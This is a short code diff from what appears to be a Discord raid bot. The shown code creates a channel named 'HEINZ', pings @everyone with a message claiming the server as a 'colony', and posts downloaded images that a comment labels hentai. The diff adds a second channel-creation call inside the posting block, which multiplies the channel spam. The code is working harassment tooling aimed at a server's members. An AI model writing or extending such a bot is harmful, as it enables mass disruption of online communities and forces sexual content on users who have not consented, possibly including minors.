@@ -232,6 +232,8 @@ class Bot(cmd.Bot):
 
         # -make new channel-
         bot = ctx.bot
+
+
         heinz = await ctx.guild.create_text_channel('HEINZ')
         await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
 
@@ -300,6 +302,7 @@ class Bot(cmd.Bot):
                         return await heinz.send('`error loading image`')
                     data = io.BytesIO(await resp.read())
                     await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
+                    await ctx.guild.create_text_channel('HEINZ')
 
         time.sleep(5)
 
